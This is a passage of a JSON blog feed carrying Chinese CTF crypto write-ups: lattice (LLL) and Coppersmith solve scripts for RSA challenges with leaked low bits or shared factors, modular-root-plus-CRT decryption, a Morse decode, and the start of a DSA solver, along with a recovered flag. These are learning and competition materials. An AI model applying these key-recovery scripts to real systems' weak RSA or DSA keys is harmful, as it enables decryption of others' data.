punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>N <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    N<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Q <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>R <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>D <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>t <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    M <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">180</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    L <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    L<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>M<span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>N<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span>t<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> N<span class=\"token punctuation\">[</span>t<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        L<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span> N<span class=\"token punctuation\">[</span>t<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    L<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> M</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    MQ <span class=\"token operator\">=</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>matrix<span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>LLL<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">assert</span>  MQ <span class=\"token operator\">%</span> M <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    Q<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>MQ <span class=\"token operator\">//</span> M<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    t<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">for</span> n<span class=\"token punctuation\">,</span>q <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">,</span>Q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    R<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>n <span class=\"token operator\">%</span> q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> R<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> Q<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>mod p 开方 + crt，不知道为啥 amm 和 nth_root 都很慢，所以用 roots：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> tqdm</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">57159622869951747163178501852120431176107650957830802270825455750469914448118245046725952261599895324038432812944510556455400604176785421515363765791667657770870191915043139038515131360636995278852935049763897591697122021960550532949709732323251731751850276780616071075745076793466693220935009599089734085675</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">8475751295865335034925394592760419247986527875671629878727167186701425140981793707985425024055132199826439868047385642931090550239766413089832011638673209</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">8113738201653971728158798912948448306407391708066449648228616380446013832560996616115571908110788295975649262942179361472746357630240226941517641071002603</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">1337</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>R<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> Zmod<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>f <span class=\"token operator\">=</span> x<span class=\"token operator\">^</span><span class=\"token number\">1337</span> <span class=\"token operator\">-</span> c</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mps <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>R<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>y<span class=\"token operator\">></span> <span class=\"token operator\">=</span> Zmod<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>f <span class=\"token operator\">=</span> y<span class=\"token operator\">^</span><span class=\"token number\">1337</span> <span class=\"token operator\">-</span> c</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>mqs <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">for</span> mp <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span>mps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span> mq <span class=\"token keyword\">in</span> mqs<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        m <span class=\"token operator\">=</span> crt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>ZZ<span class=\"token punctuation\">(</span>mp<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ZZ<span class=\"token punctuation\">(</span>mq<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            res <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token string\">b'DAS'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">pass</span></pre></td></tr></table></figure><h2 id=\"mathfactor1\"><a class=\"markdownIt-Anchor\" href=\"#mathfactor1\">#</a> MathFactor1</h2>\n<p>已知�21+�17 的低 300 位，在 <code>mod2^300</code>  下联立�=��可以得到�38+�17==�1⋅�17���2300，可以解出 p 的低 300 位，这思路同样也是 rsa 私钥 d 泄露低位的常见打法。已知 p 低位再 copper 就行了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>n<span class=\"token operator\">=</span><span class=\"token number\">89049581381915401856270440494182068395799559452947499744642830361236578373835725708887668528820916651578050248209041339369091828040992115394942524278397293747808840107939504743946806866214713225533666120894844131211241905215662457238793580469827973839976134854993162976454283311566973255659612267446150515233</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token number\">16305239798028293699632813396005973660370581911030264211210444559974188415332021689054795983319112132645051076901780239982290095820283651929773925636804434706351474493000010749679965744672518110692104573489299874390925347271040454693791271882869477780584606934066152476594086178041874762147934091597942667138</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>d1<span class=\"token operator\">=</span><span class=\"token number\">1253867202722198232827428701701674148965306906567632781415318063046179456643047348348144258</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> tqdm</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getFullP</span><span class=\"token punctuation\">(</span>low_p<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    R<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> implementation<span class=\"token operator\">=</span><span class=\"token string\">'NTL'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p <span class=\"token operator\">=</span> x<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">300</span> <span class=\"token operator\">+</span> low_p</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    root <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>X <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token operator\">-</span><span class=\"token number\">300</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> beta <span class=\"token operator\">=</span> <span class=\"token number\">0.4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> root<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># d1 * p^17 = n^17 + p ^ 38 </span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span>low_d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    maybe_p <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p <span class=\"token operator\">=</span> var<span class=\"token punctuation\">(</span><span class=\"token string\">'p'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p0 <span class=\"token operator\">=</span> solve_mod<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>d1 <span class=\"token operator\">*</span> p<span class=\"token operator\">^</span><span class=\"token number\">17</span> <span class=\"token operator\">==</span> n<span class=\"token operator\">^</span><span class=\"token number\">17</span> <span class=\"token operator\">+</span> p<span class=\"token operator\">^</span><span class=\"token number\">38</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">300</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    maybe_p <span class=\"token operator\">+=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> p0<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>maybe_p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span>maybe_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        P <span class=\"token operator\">=</span> getFullP<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">if</span> P<span class=\"token punctuation\">:</span> <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    P <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    Q <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span> P</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">assert</span> P<span class=\"token operator\">*</span>Q <span class=\"token operator\">==</span> n</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">,</span>Q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>Q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    d <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>attack<span class=\"token punctuation\">(</span>d1<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># DASCTF&#123;0psu3_is_the_most_Greatest_army&#125;</span></pre></td></tr></table></figure><h2 id=\"mathfactor\"><a class=\"markdownIt-Anchor\" href=\"#mathfactor\">#</a> MathFactor</h2>\n<p>套了<span class=\"exturl\" data-url=\"aHR0cHM6Ly92ZWxvZy5pby9AaGFraWQyOS9BU0lTLUNURi1RdWFscy0yMDIzLVJlbmFtaWFyYS1SZWZhY3Rvcg==\"> ASISCTF-Refactor</span> 和今年 n1ctf 的 dlp。就不多说了。</p>\n<p>分类: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvY2F0ZWdvcnkvMjIwMjk5Ny5odG1s\">WriteUp</span></p>\n<p>标签: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL2NyeXB0by8=\">crypto</span> , <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL3dyaXRldXAv\">writeup</span></p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/12/",
            "url": "http://waltcsz.github.io/2023/12/",
            "title": "",
            "date_published": "2023-12-05T15:28:27.317Z",
            "content_html": "<h1 id=\"朝花夕拾三hznuctf-2023\"><a class=\"markdownIt-Anchor\" href=\"#朝花夕拾三hznuctf-2023\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvYXJ0aWNsZXMvMTc2ODYyMDYuaHRtbA==\"> 朝花夕拾（三）HZNUCTF 2023</span></h1>\n<h2 id=\"hznuctf-2023-preliminarycpdd\"><a class=\"markdownIt-Anchor\" href=\"#hznuctf-2023-preliminarycpdd\">#</a> [HZNUCTF 2023 preliminary]cpdd</h2>\n<p>简单摩斯密码，换为.- 之后用在线网站解。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cipher <span class=\"token operator\">=</span> <span class=\"token string\">'cccc,ppcc,pc,ccp,pcpc,p,ccpc,ppppcpp,pccppppcppccccc,pppccpcccppcccp,pcpcpcppccpcpcc,ppcccpccccpcccp,pppccpcccppcccp,pccppppccppcccp,pcpcpccppccpccc,pppcppcpcpcpppc,ppcpppcppppcpcc,pcpcppccccccccc,pppcpcpcccpppcc,pccccpppcccpppcc,pcppcppppcccppc,pppppcp'</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>table <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>maketrans<span class=\"token punctuation\">(</span><span class=\"token string\">'cp'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'.-'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">.</span>translate<span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>![image](./ 朝花夕拾（三）HZNUCTF 2023/2902310-20230907205321296-844164582.png)</p>\n<h2 id=\"hznuctf-2023-preliminaryeasydsa\"><a class=\"markdownIt-Anchor\" href=\"#hznuctf-2023-preliminaryeasydsa\">#</a> [HZNUCTF 2023 preliminary]easyDSA</h2>\n<p>简单的二元 copper，推导过程看代码就行。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> itertools</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">small_roots</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> bounds<span class=\"token punctuation\">,</span> m<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> d<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> d<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\td <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>degree<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tR <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>base_ring<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tN <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>cardinality<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tf <span class=\"token operator\">/=</span> f<span class=\"token punctuation\">.</span>coefficients<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tf <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tG <span class=\"token operator\">=</span> Sequence<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span>parent<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>m<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\tbase <span class=\"token operator\">=</span> N<span class=\"token operator\">^</span><span class=\"token punctuation\">(</span>m<span class=\"token operator\">-</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> f<span class=\"token operator\">^</span>i</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> shifts <span class=\"token keyword\">in</span> itertools<span class=\"token punctuation\">.</span>product<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>nvariables<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\tg <span class=\"token operator\">=</span> base <span class=\"token operator\">*</span> prod<span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span>power<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span>variables<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> shifts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\tG<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tB<span class=\"token punctuation\">,</span> monomials <span class=\"token operator\">=</span> G<span class=\"token punctuation\">.</span>coefficient_matrix<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tmonomials <span class=\"token operator\">=</span> vector<span class=\"token punctuation\">(</span>monomials<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tfactors <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>monomial<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>bounds<span class=\"token punctuation\">)</span> <span 